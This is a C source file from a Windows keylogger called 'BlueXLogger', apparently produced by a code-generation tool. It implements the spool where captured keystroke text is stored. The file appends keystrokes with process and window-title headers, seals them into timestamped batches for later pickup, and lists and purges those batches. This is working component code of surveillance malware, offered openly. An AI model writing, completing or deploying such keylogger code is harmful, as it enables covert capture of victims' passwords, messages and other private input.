/*============================================================================
 * BlueXLogger - bxl_logbuf.c
 * Crash-safe append-only spool for captured keystroke text.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_logbuf.h"
#include "bxl_format.h"

/*==========================================================================
 * Init / teardown
 *========================================================================*/
int bxl_logbuf_init(BxlLogBuf *lb, const wchar_t *dir)
{
    if (!lb || !dir) return BXL_FALSE;

    memset(lb, 0, sizeof(*lb));
    InitializeCriticalSection(&lb->cs);

    StringCchCopyW(lb->dir, BXL_COUNT_OF(lb->dir), dir);

    if (!bxl_dir_create(lb->dir)) {
        bxl_logf("logbuf: cannot create spool dir");
        DeleteCriticalSection(&lb->cs);
        return BXL_FALSE;
    }

    if (!bxl_path_join(lb->active, BXL_COUNT_OF(lb->active),
                       lb->dir, BXL_ACTIVE_NAME)) {
        DeleteCriticalSection(&lb->cs);
        return BXL_FALSE;
    }

    lb->bytes = bxl_file_size(lb->active);
    lb->ready = 1;
    return BXL_TRUE;
}

void bxl_logbuf_close(BxlLogBuf *lb)
{
    if (!lb || !lb->ready) return;
    lb->ready = 0;
    DeleteCriticalSection(&lb->cs);
}

/*==========================================================================
 * Append
 *========================================================================*/
int bxl_logbuf_append(BxlLogBuf *lb, const void *data, size_t len)
{
    int ok;

    if (!lb || !lb->ready || !data || len == 0) return BXL_FALSE;

    EnterCriticalSection(&lb->cs);
    ok = bxl_file_append_flush(lb->active, data, len);
    if (ok) lb->bytes += len;
    LeaveCriticalSection(&lb->cs);

    return ok;
}

int bxl_logbuf_append_text(BxlLogBuf *lb, const char *s)
{
    if (!s) return BXL_FALSE;
    return bxl_logbuf_append(lb, s, strlen(s));
}

/*==========================================================================
 * Context headers
 *========================================================================*/
int bxl_logbuf_note_context(BxlLogBuf *lb, const char *process,
                            const char *title, bxl_u64 unix_now)
{
    BxlBuf line;
    char   stamp[32];
    int    changed = 0;
    int    ok;

    if (!lb || !lb->ready) return BXL_FALSE;

    process = process ? process : "";
    title   = title   ? title   : "";

    EnterCriticalSection(&lb->cs);
    if (strcmp(lb->ctx_proc, process) != 0 ||
        strcmp(lb->ctx_title, title) != 0) {
        changed = 1;
        bxl_str_copy(lb->ctx_proc,  sizeof(lb->ctx_proc),  process);
        bxl_str_copy(lb->ctx_title, sizeof(lb->ctx_title), title);
    }
    LeaveCriticalSection(&lb->cs);

    if (!changed) return BXL_FALSE;

    if (!bxl_buf_init(&line, 1024)) return BXL_FALSE;

    bxl_format_timestamp(unix_now, stamp, sizeof(stamp));
    bxl_buf_appendc(&line, '\n');
    bxl_fmt_context_header(&line, stamp, process, title);
    bxl_buf_appendc(&line, '\n');

    ok = bxl_logbuf_append(lb, line.data, line.len);
    bxl_buf_free(&line);
    return ok;
}

/*==========================================================================
 * Accounting
 *========================================================================*/
bxl_u64 bxl_logbuf_pending_bytes(BxlLogBuf *lb)
{
    bxl_u64 v;
    if (!lb || !lb->ready) return 0;
    EnterCriticalSection(&lb->cs);
    v = bxl_file_size(lb->active);
    LeaveCriticalSection(&lb->cs);
    return v;
}

bxl_u32 bxl_logbuf_entry_count(BxlLogBuf *lb)
{
    bxl_u32 v;
    if (!lb) return 0;
    EnterCriticalSection(&lb->cs);
    v = lb->entries;
    LeaveCriticalSection(&lb->cs);
    return v;
}

/*==========================================================================
 * Seal
 *========================================================================*/
int bxl_logbuf_seal(BxlLogBuf *lb, wchar_t *batch_path, size_t path_cch,
                    size_t *bytes_out)
{
    wchar_t name[128];
    wchar_t dest[MAX_PATH * 2];
    bxl_u64 size;
    int     attempt;

    if (bytes_out) *bytes_out = 0;
    if (!lb || !lb->ready || !batch_path) return BXL_FALSE;

    EnterCriticalSection(&lb->cs);

    size = bxl_file_size(lb->active);
    if (size == 0) {
        LeaveCriticalSection(&lb->cs);
        return BXL_FALSE;   /* nothing captured - do not create an empty batch */
    }

    for (attempt = 0; attempt < 64; attempt++) {
        char ts[32];
        bxl_format_timestamp_compact(bxl_unix_time(), ts, sizeof(ts));
        lb->seq++;

        if (FAILED(StringCchPrintfW(name, BXL_COUNT_OF(name),
                                    L"%s%hs_%04u.log", BXL_BATCH_PREFIX,
                                    ts, lb->seq & 0xFFFFu))) {
            LeaveCriticalSection(&lb->cs);
            return BXL_FALSE;
        }
        if (!bxl_path_join(dest, BXL_COUNT_OF(dest), lb->dir, name)) {
            LeaveCriticalSection(&lb->cs);
            return BXL_FALSE;
        }
        if (!bxl_path_exists(dest)) break;
    }

    if (attempt == 64) {
        LeaveCriticalSection(&lb->cs);
        return BXL_FALSE;
    }

    /* Atomic: the bytes are now either in the active spool or in the batch.
     * A crash between here and the next append loses nothing. */
    if (!MoveFileExW(lb->active, dest, MOVEFILE_REPLACE_EXISTING)) {
        LeaveCriticalSection(&lb->cs);
        bxl_logf("logbuf: seal failed (%lu)", GetLastError());
        return BXL_FALSE;
    }

    lb->bytes = 0;
    LeaveCriticalSection(&lb->cs);

    StringCchCopyW(batch_path, path_cch, dest);
    if (bytes_out) *bytes_out = (size_t)size;
    return BXL_TRUE;
}

/*==========================================================================
 * Enumerate / delete
 *========================================================================*/
typedef struct BatchRec {
    wchar_t path[MAX_PATH * 2];
    bxl_u64 mtime;
} BatchRec;

static int cmp_batch(const void *a, const void *b)
{
    const BatchRec *x = (const BatchRec *)a;
    const BatchRec *y = (const BatchRec *)b;
    if (x->mtime < y->mtime) return -1;
    if (x->mtime > y->mtime) return 1;
    return wcscmp(x->path, y->path);
}

int bxl_logbuf_scan(BxlLogBuf *lb, wchar_t (*paths)[MAX_PATH * 2], int max_paths)
{
    WIN32_FIND_DATAW fd;
    HANDLE  h;
    wchar_t pattern[MAX_PATH * 2];
    BatchRec *recs;
    int      count = 0, i;

    if (!lb || !paths || max_paths <= 0) return 0;

    recs = (BatchRec *)calloc((size_t)max_paths, sizeof(BatchRec));
    if (!recs) return 0;

    if (FAILED(StringCchPrintfW(pattern, BXL_COUNT_OF(pattern),
                                L"%s\\%s*", lb->dir, BXL_BATCH_PREFIX))) {
        free(recs);
        return 0;
    }

    h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) { free(recs); return 0; }

    do {
        wchar_t full[MAX_PATH * 2];
        bxl_u64 mt = 0;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (count >= max_paths) break;

        if (!bxl_path_join(full, BXL_COUNT_OF(full), lb->dir, fd.cFileName))
            continue;

        (void)bxl_file_mtime(full, &mt);
        StringCchCopyW(recs[count].path, BXL_COUNT_OF(recs[count].path), full);
        recs[count].mtime = mt;
        count++;
    } while (FindNextFileW(h, &fd));

    FindClose(h);

    qsort(recs, (size_t)count, sizeof(BatchRec), cmp_batch);

    for (i = 0; i < count; i++)
        StringCchCopyW(paths[i], MAX_PATH * 2, recs[i].path);

    free(recs);
    return count;
}

int bxl_logbuf_delete_batch(const wchar_t *path)
{
    if (!path) return BXL_FALSE;
    return bxl_file_delete(path);
}

int bxl_logbuf_purge(BxlLogBuf *lb, bxl_u32 age_days, bxl_u32 *deleted_out)
{
    if (!lb) return BXL_FALSE;
    return bxl_purge_old_files(lb->dir, BXL_BATCH_PREFIX, age_days, deleted_out);
}
